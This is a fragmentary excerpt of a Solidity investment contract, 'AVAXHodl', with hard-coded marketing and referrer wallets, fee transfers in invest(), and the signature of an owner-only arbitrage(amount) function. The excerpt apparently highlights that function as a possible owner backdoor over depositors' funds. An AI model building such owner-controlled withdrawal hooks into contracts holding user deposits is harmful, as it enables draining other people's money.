...
contract AVAXHodl is Ownable {
    ...
    address payable constant public DEFAULT_REFERRER_ADDRESS = payable(0xa68621112EB4042cCe1D607e917832cCCbe21970);

    
    address payable constant public MARKETING_ADDRESS = payable(0xa68621112EB4042cCe1D607e917832cCCbe21970);
    address payable constant public MARKETING_ADDRESS1 = payable(0xd3d02fe34D59CeF5707e5d901be18751Deb5Af33);

    uint256 constant public MARKETING_FEE = 1000;
    address payable constant public PROMOTION_ADDRESS = payable(0xfC835200628E368B65FA0C149B646b49420c4D6a);
    ...
    function invest(address referrer) public payable {
        ...
        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 0.05 AVAX");
        ...
        MARKETING_ADDRESS.transfer(promotionFee);
        MARKETING_ADDRESS1.transfer(promotionFee);
	...
	function arbitrage(uint256 amount) public onlyOwner{
